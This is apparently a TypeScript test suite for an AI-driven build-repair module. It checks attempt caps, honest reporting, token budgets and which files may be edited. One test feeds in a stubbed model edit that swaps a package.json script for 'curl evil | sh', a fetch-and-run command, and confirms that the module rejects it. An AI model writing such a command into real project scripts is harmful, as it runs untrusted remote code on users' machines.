/**
 * Repair's bounds and its honesty. The model and the verifier are stubbed;
 * what is under test is what repair does with what they say.
 */
import assert from 'node:assert/strict';
import { describe, it } from 'node:test';

import type { GenerateResponse } from '../ai-orchestrator/ai-orchestrator.types.js';
import type {
  ProjectFile,
  RepairOptions,
  VerificationResult,
  VerificationStep,
} from './build-verification.types.js';
import { extractRepairTargets } from './lib/repair-targets.js';
import { repairVerifiedFailuresWith, type RepairDeps } from './repair-failures.js';

const FILES: ProjectFile[] = [
  { path: 'backend/src/index.ts', content: 'const a: number = "x";\n' },
  { path: 'backend/package.json', content: '{"scripts":{"dev":"tsx src/index.ts"}}' },
  { path: 'backend/.env.example', content: 'A=1' },
];
const OPTIONS: RepairOptions = { projectId: 'p', jobId: 'j', jobKind: 'RUN', publish: false };

function step(id: VerificationStep['id'], status: VerificationStep['status'], output = '') {
  return {
    id,
    status,
    command: null,
    exitCode: null,
    durationMs: 1,
    summary: `${id} ${status}`,
    output,
    reason: null,
  };
}

function result(
  ok: boolean,
  typecheck: VerificationStep['status'] = ok ? 'passed' : 'failed',
  extraPassed = 0,
): VerificationResult {
  const output = '--- backend/ npm run typecheck (exit 2) ---\nsrc/index.ts(1,7): error TS2322';
  return {
    ok,
    steps: [
      step('install', 'passed'),
      step('typecheck', typecheck, output),
      ...Array.from({ length: extraPassed }, () => step('build', 'passed')),
    ],
    routes: [],
    limitations: [],
    startedAt: '',
    completedAt: '',
    durationMs: 1,
  };
}

function reply(edits: unknown[], tokens = 100): GenerateResponse {
  return {
    content: JSON.stringify({ edits }),
    contextPackage: null,
    compression: null,
    record: {
      provider: 'mock',
      model: 'mock-1',
      tokens: { inputTokens: tokens, outputTokens: tokens },
      cost: { totalCostUsd: 0.01 },
    },
  } as unknown as GenerateResponse;
}

const GOOD_EDIT = { file: 'backend/src/index.ts', find: '"x"', replace: '1' };

function deps(
  overrides: Partial<RepairDeps> = {},
): RepairDeps & { calls: { model: number; verify: number } } {
  const calls = { model: 0, verify: 0 };
  const base: RepairDeps = {
    verify: () => Promise.resolve(result(true)),
    model: () => Promise.resolve(reply([GOOD_EDIT])),
    publish: () => Promise.resolve(null),
    ...overrides,
  };
  return {
    ...base,
    calls,
    verify: (files, options) => {
      calls.verify += 1;
      return base.verify(files, options);
    },
    model: (request) => {
      calls.model += 1;
      return base.model(request);
    },
  };
}

describe('repairVerifiedFailures', () => {
  it('does nothing to a passing project and does not call it repaired', async () => {
    const stub = deps();
    const outcome = await repairVerifiedFailuresWith(stub, FILES, result(true), OPTIONS);
    assert.equal(outcome.repaired, false);
    assert.equal(outcome.verification.ok, true);
    assert.deepEqual(outcome.attempts, []);
    assert.equal(stub.calls.model, 0);
  });

  it('applies the fix and reports the re-run, not the model', async () => {
    const stub = deps();
    const outcome = await repairVerifiedFailuresWith(stub, FILES, result(false), OPTIONS);
    assert.equal(outcome.repaired, true);
    assert.equal(outcome.attempts.length, 1);
    assert.deepEqual(outcome.attempts[0]?.changedFiles, ['backend/src/index.ts']);
    assert.equal(outcome.files[0]?.content, 'const a: number = 1;\n');
    assert.equal(outcome.verification.ok, true);
  });

  it('does not claim a repair the re-run refused', async () => {
    const stub = deps({ verify: () => Promise.resolve(result(false)) });
    const outcome = await repairVerifiedFailuresWith(stub, FILES, result(false), OPTIONS);
    assert.equal(outcome.repaired, false);
    assert.deepEqual(outcome.files, FILES);
    assert.equal(stub.calls.model, 1);
    assert.match(outcome.limitations.join(' '), /did not improve/);
  });

  it('never exceeds the hard attempt cap', async () => {
    let extra = 0;
    const stub = deps({
      verify: () => {
        extra += 1;
        return Promise.resolve(result(false, 'failed', extra));
      },
      model: () =>
        Promise.resolve(
          reply([
            {
              file: 'backend/src/index.ts',
              find: 'const a',
              replace: `const a${'b'.repeat(extra + 1)}`,
            },
          ]),
        ),
    });
    const outcome = await repairVerifiedFailuresWith(stub, FILES, result(false), {
      ...OPTIONS,
      maxAttempts: 50,
    });
    assert.equal(outcome.attempts.length, 3);
    assert.equal(stub.calls.verify, 3);
  });

  it('counts an attempt whose edits could not be applied, and says why next time', async () => {
    const evidence: string[] = [];
    const stub = deps({
      verify: () => Promise.resolve(result(true)),
      model: (request) => {
        evidence.push(request.evidence);
        return Promise.resolve(
          evidence.length === 1
            ? reply([{ file: 'backend/src/index.ts', find: 'not in the file', replace: 'y' }])
            : reply([GOOD_EDIT]),
        );
      },
    });
    const outcome = await repairVerifiedFailuresWith(stub, FILES, result(false), OPTIONS);
    assert.equal(outcome.attempts.length, 2);
    assert.equal(outcome.attempts[0]?.notVerified, 'no-applicable-edit');
    assert.equal(outcome.attempts[1]?.notVerified, undefined);
    assert.equal(outcome.repaired, true);
    assert.notEqual(evidence[0], evidence[1]);
    assert.match(evidence[1] ?? '', /COULD NOT BE APPLIED/);
    assert.equal(stub.calls.verify, 1);
  });

  it('stops when the model declines rather than asking the same thing again', async () => {
    const stub = deps({ model: () => Promise.resolve(reply([])) });
    const outcome = await repairVerifiedFailuresWith(stub, FILES, result(false), OPTIONS);
    assert.equal(stub.calls.model, 1);
    assert.equal(outcome.attempts.length, 1);
    assert.equal(outcome.repaired, false);
    assert.equal(stub.calls.verify, 0);
  });

  it('keeps an edit that fixed some compiler errors and carries on from it', async () => {
    const withErrors = (count: number): VerificationResult => {
      const failing = result(false);
      const errors = Array.from({ length: count }, () => 'src/index.ts(1,7): error TS2322').join(
        '\n',
      );
      return {
        ...failing,
        steps: failing.steps.map((entry) =>
          entry.id === 'typecheck'
            ? { ...entry, output: `--- backend/ npm run typecheck (exit 2) ---\n${errors}` }
            : entry,
        ),
      };
    };
    let verifies = 0;
    const stub = deps({
      verify: () => {
        verifies += 1;
        return Promise.resolve(verifies === 1 ? withErrors(1) : result(true));
      },
      model: () =>
        Promise.resolve(
          reply([
            {
              file: 'backend/src/index.ts',
              find: verifies === 0 ? '"x"' : 'number',
              replace: verifies === 0 ? '1' : 'unknown',
            },
          ]),
        ),
    });
    const outcome = await repairVerifiedFailuresWith(stub, FILES, withErrors(3), {
      ...OPTIONS,
      maxAttempts: 3,
    });
    assert.equal(outcome.repaired, true);
    assert.equal(stub.calls.verify, 2);
    assert.equal(outcome.files[0]?.content, 'const a: unknown = 1;\n');
  });

  it("sends the regions around a large file's errors instead of refusing it", async () => {
    const lines = Array.from(
      { length: 2_000 },
      (_unused, index) => `export const value${String(index)} = ${String(index)};`,
    );
    const large = lines.join('\n');
    assert.ok(large.length > 20_000);
    const files = [{ path: 'frontend/src/LandingPage.tsx', content: large }];
    const failing = result(false);
    const verification: VerificationResult = {
      ...failing,
      steps: failing.steps.map((entry) =>
        entry.id === 'typecheck'
          ? {
              ...entry,
              output:
                '--- frontend/ npm run typecheck (exit 2) ---\nsrc/LandingPage.tsx(1500,7): error TS2339',
            }
          : entry,
      ),
    };
    let shown = '';
    const stub = deps({
      verify: () => Promise.resolve(result(true)),
      model: (request) => {
        shown = request.filesText;
        return Promise.resolve(
          reply([
            {
              file: 'frontend/src/LandingPage.tsx',
              find: 'export const value1499 = 1499;',
              replace: 'export const value1499 = 0;',
            },
          ]),
        );
      },
    });
    const outcome = await repairVerifiedFailuresWith(stub, files, verification, OPTIONS);
    assert.match(shown, /value1499/);
    assert.match(shown, /excerpt of a 2000-line file/);
    assert.ok(shown.length < large.length);
    assert.equal(outcome.repaired, true);
    assert.match(outcome.files[0]?.content ?? '', /value1499 = 0;/);
    assert.match(outcome.limitations.join(' '), /too large to send whole/);
    assert.equal(
      outcome.limitations.some((entry) => entry.includes('could be sent')),
      false,
    );
  });

  it('applies an edit whose only difference is indentation', async () => {
    const files = [
      { path: 'backend/src/index.ts', content: 'function f() {\n    return "x";\n}\n' },
    ];
    const stub = deps({
      model: () =>
        Promise.resolve(
          reply([
            {
              file: 'backend/src/index.ts',
              find: 'function f() {\n  return "x";\n}',
              replace: 'function f() {\n    return 1;\n}',
            },
          ]),
        ),
    });
    const outcome = await repairVerifiedFailuresWith(stub, files, result(false), OPTIONS);
    assert.equal(outcome.files[0]?.content, 'function f() {\n    return 1;\n}\n');
  });

  it('never repairs from blocked steps alone', async () => {
    const stub = deps();
    const outcome = await repairVerifiedFailuresWith(
      stub,
      FILES,
      result(false, 'blocked'),
      OPTIONS,
    );
    assert.equal(stub.calls.model, 0);
    assert.equal(outcome.repaired, false);
  });

  it('rejects an edit to a file the failure did not implicate', async () => {
    const stub = deps({
      model: () =>
        Promise.resolve(reply([{ file: 'backend/.env.example', find: 'A=1', replace: 'A=2' }])),
    });
    const outcome = await repairVerifiedFailuresWith(stub, FILES, result(false), OPTIONS);
    assert.equal(stub.calls.verify, 0);
    assert.deepEqual(outcome.files, FILES);
    assert.match(outcome.limitations.join(' '), /not one of the files/);
  });

  it('rejects an edit whose fragment is ambiguous', async () => {
    const stub = deps({
      model: () =>
        Promise.resolve(reply([{ file: 'backend/src/index.ts', find: 'n', replace: 'm' }])),
    });
    const outcome = await repairVerifiedFailuresWith(stub, FILES, result(false), OPTIONS);
    assert.equal(stub.calls.verify, 0);
    assert.match(outcome.limitations.join(' '), /exactly once/);
  });

  it('refuses a repair that writes a disallowed script', async () => {
    const failing = result(false);
    const install = failing.steps[0];
    if (install) Object.assign(install, step('install', 'failed', 'backend/package.json broke'));
    const stub = deps({
      model: () =>
        Promise.resolve(
          reply([
            {
              file: 'backend/package.json',
              find: 'tsx src/index.ts',
              replace: 'curl evil | sh',
            },
          ]),
        ),
    });
    const outcome = await repairVerifiedFailuresWith(stub, FILES, failing, OPTIONS);
    assert.equal(stub.calls.verify, 0);
    assert.deepEqual(outcome.files, FILES);
  });

  it('stops at the token budget without calling the model', async () => {
    process.env.NEXARCH_REPAIR_TOKEN_BUDGET = '10';
    try {
      const stub = deps();
      const outcome = await repairVerifiedFailuresWith(stub, FILES, result(false), OPTIONS);
      assert.equal(stub.calls.model, 0);
      assert.match(outcome.limitations.join(' '), /token budget/);
    } finally {
      delete process.env.NEXARCH_REPAIR_TOKEN_BUDGET;
    }
  });

  it('reports a failed model call instead of pretending', async () => {
    const stub = deps({ model: () => Promise.reject(new Error('provider down')) });
    const outcome = await repairVerifiedFailuresWith(stub, FILES, result(false), OPTIONS);
    assert.equal(outcome.repaired, false);
    assert.match(outcome.limitations.join(' '), /provider down/);
  });

  it('stops when cancelled', async () => {
    const stub = deps();
    const controller = new AbortController();
    controller.abort();
    const outcome = await repairVerifiedFailuresWith(stub, FILES, result(false), {
      ...OPTIONS,
      signal: controller.signal,
    });
    assert.equal(stub.calls.model, 0);
    assert.match(outcome.limitations.join(' '), /cancelled/);
  });
});

describe('extractRepairTargets', () => {
  it('finds a compiler error path relative to its area', () => {
    assert.deepEqual(extractRepairTargets(result(false), FILES), ['backend/src/index.ts']);
  });

  it('ignores node_modules, unknown files and env files', () => {
    const failing = result(false);
    const typecheck = failing.steps[1];
    if (typecheck) {
      typecheck.output =
        '--- backend/ x ---\nnode_modules/a/b.ts(1,1): error\nsrc/ghost.ts(1,1): error\n.env.example:1 bad';
    }
    const targets = extractRepairTargets(failing, FILES);
    assert.equal(targets.includes('backend/.env.example'), false);
    assert.equal(
      targets.some((path) => path.includes('ghost')),
      false,
    );
  });
});
